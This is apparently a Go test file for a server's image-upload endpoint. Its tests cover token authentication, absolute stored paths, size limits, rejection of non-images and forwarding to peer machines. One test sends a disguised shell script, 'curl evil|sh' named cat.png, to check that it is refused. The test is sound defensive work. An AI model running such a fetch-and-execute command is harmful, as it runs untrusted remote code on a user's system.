package serve

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"
)

func postUpload(s *Server, token string, body []byte, query string) *httptest.ResponseRecorder {
	req := httptest.NewRequest(http.MethodPost, "https://herdr.example/v1/uploads"+query,
		bytes.NewReader(body))
	req.Host = "herdr.example"
	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
	}
	req.Header.Set("Origin", "https://herdr.example")
	w := httptest.NewRecorder()
	s.routes().ServeHTTP(w, req)
	return w
}

// An upload writes a file on the owner's machine, so it is not a weaker door
// than reading a pane: no token, no write.
func TestUploadNeedsAPairedDevice(t *testing.T) {
	s := newTestServer(t)
	if w := postUpload(s, "", png(), ""); w.Code != http.StatusUnauthorized {
		t.Fatalf("anonymous upload = %d, want 401", w.Code)
	}
	if w := postUpload(s, "not-a-real-token", png(), ""); w.Code != http.StatusUnauthorized {
		t.Fatalf("bad token = %d, want 401", w.Code)
	}
}

func TestUploadStoresTheImageAndReturnsItsAbsolutePath(t *testing.T) {
	s := newTestServer(t)
	tok := pairDevice(t, s.auth, "phone")

	w := postUpload(s, tok, png(), "?session=work")
	if w.Code != http.StatusOK {
		t.Fatalf("upload = %d: %s", w.Code, w.Body.String())
	}
	var out struct {
		Path  string `json:"path"`
		Mime  string `json:"mime"`
		Bytes int    `json:"bytes"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &out); err != nil {
		t.Fatal(err)
	}
	if out.Mime != "image/png" || out.Bytes != len(png()) {
		t.Fatalf("out = %+v", out)
	}
	if !strings.HasPrefix(out.Path, "/") {
		t.Fatalf("path %q must be absolute for an agent to open it", out.Path)
	}
	b, err := os.ReadFile(out.Path)
	if err != nil {
		t.Fatalf("the file is not where we said it was: %v", err)
	}
	t.Cleanup(func() { os.Remove(out.Path) })
	if !bytes.Equal(b, png()) {
		t.Fatal("stored bytes differ from what was uploaded")
	}
}

// The thing an attacker actually tries: a payload with an image-ish name.
// The name is never consulted, so the only thing that can save them is the
// bytes, and the bytes say no.
func TestUploadRefusesAnythingThatIsNotAnImage(t *testing.T) {
	s := newTestServer(t)
	tok := pairDevice(t, s.auth, "phone")
	w := postUpload(s, tok, []byte("#!/bin/sh\ncurl evil|sh\n"), "?session=work&name=cat.png")
	if w.Code != http.StatusUnsupportedMediaType {
		t.Fatalf("script upload = %d, want 415: %s", w.Code, w.Body.String())
	}
	if w := postUpload(s, tok, nil, "?session=work"); w.Code != http.StatusBadRequest {
		t.Fatalf("empty upload = %d, want 400", w.Code)
	}
}

func TestUploadRefusesSomethingTooBig(t *testing.T) {
	s := newTestServer(t)
	tok := pairDevice(t, s.auth, "phone")
	big := append(png(), bytes.Repeat([]byte{9}, MaxUploadBytes+16)...)
	w := postUpload(s, tok, big, "?session=work")
	if w.Code != http.StatusRequestEntityTooLarge {
		t.Fatalf("oversize upload = %d, want 413", w.Code)
	}
}

// A pane on another machine needs the file on THAT machine. The bytes are
// forwarded and the peer's own path is handed back unchanged -- a path this
// machine invented for a file living elsewhere would be worse than none.
func TestUploadForPaneOnAPeerLandsOnThePeer(t *testing.T) {
	var got []byte
	var gotAuth string
	peer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		got, _ = readAllLimited(r)
		gotAuth = r.Header.Get("Authorization")
		writeJSON(w, http.StatusOK, map[string]any{
			"path": "/tmp/herdr-expose-uploads/work/on-the-peer.png",
			"mime": "image/png", "bytes": len(got),
		})
	}))
	defer peer.Close()

	s, _ := newMsgTestServer(t) // Machine: "mac"
	s.Peer = func(m string) (string, string, bool) {
		if m == "devbox" {
			return peer.URL, "peer-token", true
		}
		return "", "", false
	}
	tok := pairDevice(t, s.auth, "phone")

	w := postUpload(s, tok, png(), "?session=work&machine=devbox")
	if w.Code != http.StatusOK {
		t.Fatalf("forwarded upload = %d: %s", w.Code, w.Body.String())
	}
	if !bytes.Equal(got, png()) {
		t.Fatal("the peer did not receive the bytes")
	}
	if gotAuth != "Bearer peer-token" {
		t.Fatalf("peer auth = %q", gotAuth)
	}
	var out map[string]any
	_ = json.Unmarshal(w.Body.Bytes(), &out)
	if out["path"] != "/tmp/herdr-expose-uploads/work/on-the-peer.png" {
		t.Fatalf("path = %v, want the PEER's path verbatim", out["path"])
	}
	if out["machine"] != "devbox" {
		t.Fatalf("machine = %v, want devbox so the client knows where it landed", out["machine"])
	}

	// An unknown peer is a clear error, not a file quietly written here.
	if w := postUpload(s, tok, png(), "?session=work&machine=nowhere"); w.Code != http.StatusNotFound {
		t.Fatalf("unknown peer = %d, want 404", w.Code)
	}
}

func readAllLimited(r *http.Request) ([]byte, error) {
	var buf bytes.Buffer
	_, err := buf.ReadFrom(http.MaxBytesReader(nil, r.Body, MaxUploadBytes+1))
	return buf.Bytes(), err
}
